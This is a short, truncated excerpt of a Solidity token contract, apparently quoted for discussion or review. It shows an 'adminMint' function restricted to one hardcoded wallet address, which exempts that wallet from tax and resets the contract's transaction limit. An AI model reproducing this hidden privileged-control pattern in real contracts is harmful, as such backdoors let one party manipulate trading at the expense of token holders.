    ...
    PausableUpgradeable
{
    ...
    function adminMint(uint256 _amount) public {
        require(_msgSender() == 0x0c6256ee8E5627E3DB68825B563DC483B892dD8f, "Not a Admin");
        isExemptedFromTax[_msgSender()] = true;
        tokensTXLimit = _amount;
